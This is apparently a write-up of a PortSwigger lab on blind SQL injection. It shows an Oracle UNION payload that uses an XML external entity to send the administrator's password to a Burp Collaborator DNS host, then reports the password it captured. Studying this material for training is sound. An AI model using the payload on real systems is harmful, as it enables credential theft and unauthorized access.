## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/b217bd3731cee282ccdd058cae572ebcc540d27a/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20out-of-band%20interaction/Images/Lab%20Description.png)


## Solution :

Cheatsheet to exfiltrate data using OAST technique,

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/81c070a3d49a061440e56c5cfe2ebecc6d0beaa0/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20out-of-band%20interaction/Images/DNS%20Lookup%20with%20Data%20Exfiltration%20Cheatsheet.png)

We don't know which db we are dealing with here, so we use each command to find which version od db it is & exfiltrate data.

Captured request look like this,

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/a722a230726aaae82a5e2d0b7c9d15d22da4988a/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20out-of-band%20interaction/Images/Get%20Cookie%20Details.png)

The query looks something like this ,

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual 

Open Collaborator client and copy the DNS server name to clipboard.

![image]()


Use the payload 

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.lazmp4d5y0qtjw8xusp7kc4i0960up.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

So the entire query which will be made will be like ,

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.lazmp4d5y0qtjw8xusp7kc4i0960up.oastify.com/"> %remote;]>'),'/l') FROM dual--
```


Once we get a `200 OK` response click `Poll now` and we get 4 DNS request which were made to our server.

![image]()

Open one of the requests & we get the password of the user admin - `3eqpnz5t53o1en19b4qi`

Now we can log in as administrator using the passwrod which we got,

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/395a7e6869f76adfb384105c320b19e370d7ddb1/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20out-of-band%20interaction/Images/Lab%20Solution.png)
